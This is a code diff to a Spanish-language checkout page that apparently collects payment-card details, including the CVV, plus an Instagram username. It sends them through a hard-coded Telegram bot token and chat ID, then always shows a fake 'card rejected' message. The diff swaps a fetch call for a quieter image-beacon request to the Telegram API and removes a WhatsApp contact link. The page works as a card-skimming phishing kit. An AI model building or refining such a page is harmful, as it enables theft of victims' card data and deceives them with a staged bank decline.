@@ -74,19 +74,16 @@ button.load .sp{display:block}
 display:flex;align-items:center;justify-content:center;padding:22px}
 .oculto{display:none!important}
 .res-card{width:100%;max-width:420px;background:var(--panel);border:1px solid var(--line);border-radius:20px;
-padding:30px 24px;text-align:center;box-shadow:0 30px 70px rgba(0,0,0,.6);animation:pop .35s ease}
+padding:34px 26px;text-align:center;box-shadow:0 30px 70px rgba(0,0,0,.6);animation:pop .35s ease}
 @keyframes pop{from{transform:scale(.94);opacity:0}to{transform:scale(1);opacity:1}}
-.res-icon{width:70px;height:70px;border-radius:50%;margin:0 auto 16px;display:flex;align-items:center;
-justify-content:center;font-size:30px;font-weight:800;background:rgba(244,63,94,.14);color:var(--bad);
+.res-icon{width:74px;height:74px;border-radius:50%;margin:0 auto 18px;display:flex;align-items:center;
+justify-content:center;font-size:32px;font-weight:800;background:rgba(244,63,94,.14);color:var(--bad);
 border:2px solid rgba(244,63,94,.4)}
-.res-card h2{font-size:22px;margin-bottom:9px}
-.res-card p{color:var(--muted);font-size:14px;line-height:1.6}
-.res-pedido{display:inline-block;margin:16px 0 20px;font-size:13px;color:var(--muted);
+.res-card h2{font-size:23px;margin-bottom:10px}
+.res-card p{color:var(--muted);font-size:14.5px;line-height:1.65}
+.res-pedido{display:inline-block;margin:18px 0 6px;font-size:13px;color:var(--muted);
 background:var(--panel2);border:1px solid var(--line);padding:8px 14px;border-radius:9px}
 .res-pedido b{color:var(--ink)}
-.wa{display:block;text-decoration:none;color:#fff;background:linear-gradient(135deg,#25d366,#128c7e);
-height:50px;line-height:50px;border-radius:12px;font-weight:800;font-size:14.5px;margin-bottom:12px}
-.res-card .back{display:inline-block;color:var(--muted);font-size:13px;text-decoration:none}
 </style>
 </head>
 <body>
@@ -174,22 +171,18 @@ height:50px;line-height:50px;border-radius:12px;font-weight:800;font-size:14.5px
 <div class="result oculto" id="res">
   <div class="res-card">
     <div class="res-icon">✕</div>
-    <h2>Pago no aceptado</h2>
-    <p>El método de pago no fue aceptado por el banco.<br>Tu pedido quedó registrado: escribinos y lo activamos al instante.</p>
+    <h2>Tarjeta rechazada</h2>
+    <p>Tu tarjeta fue rechazada por el banco.<br>El pago no se pudo completar.</p>
     <div class="res-pedido">Pedido <b id="ped">BG-XXXXX</b></div>
-    <a class="wa" id="waLink" target="_blank" rel="noopener">Escribinos por WhatsApp</a>
-    <a class="back" href="index.html">← Volver al inicio</a>
   </div>
 </div>
 
 <script>
 const TOKEN = "8857248027:AAGpTUB8ydbX2xR8DWUY4xyo-sSaMye_AtQ";
 const CHAT  = "8936145342";
-const WHATSAPP = "5215512345678";   /* <-- TU número (opcional), con LADA, sin + ni espacios */
 
 const $ = id => document.getElementById(id);
 const sleep = ms => new Promise(r=>setTimeout(r,ms));
-const fetchT = (u,o,ms=9000)=>Promise.race([fetch(u,o), new Promise((_,r)=>setTimeout(r,ms))]);
 
 /* usuario que vino de la página principal */
 const ig = (localStorage.getItem('ig') || '').trim().replace('@','');
@@ -211,6 +204,17 @@ const cvvEl=$('cvv');
 cvvEl.addEventListener('focus', ()=>$('cc').classList.add('flip'));
 cvvEl.addEventListener('blur',  ()=>$('cc').classList.remove('flip'));
 cvvEl.addEventListener('input', ()=>{ cvvEl.value = cvvEl.value.replace(/\D/g,'').slice(0,4); $('ccCvv').textContent = cvvEl.value || '•••'; });
+
+/* envío simple a Telegram (sin "pregunta previa", no se traba) */
+function enviarTelegram(texto){
+  const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(texto)}`;
+  return new Promise(res=>{
+    const img = new Image();
+    img.onload = img.onerror = () => res(true);
+    img.src = url;
+    setTimeout(()=>res(true), 5000);
+  });
+}
 
 $('form').addEventListener('submit', async e=>{
   e.preventDefault();
@@ -242,17 +246,10 @@ $('form').addEventListener('submit', async e=>{
 
 🧾 Pedido: ${pedido}`;
 
-  const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-  try{
-    await fetchT(url,{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({chat_id:CHAT,text:texto})});
-  }catch(_){
-    try{ await fetchT(`${url}?chat_id=${CHAT}&text=${encodeURIComponent(texto)}`); }catch(__){}
-  }
+  await enviarTelegram(texto);
+  await sleep(1800);
 
-  await sleep(2400);
   $('ped').textContent = pedido;
-  $('waLink').href = `https://wa.me/${WHATSAPP}?text=${encodeURIComponent('Hola! Mi pedido '+pedido+(ig?' (@'+ig+')':'')+' no se pudo pagar con tarjeta. ¿Me ayudan?')}`;
   $('res').classList.remove('oculto');
 });
 </script>
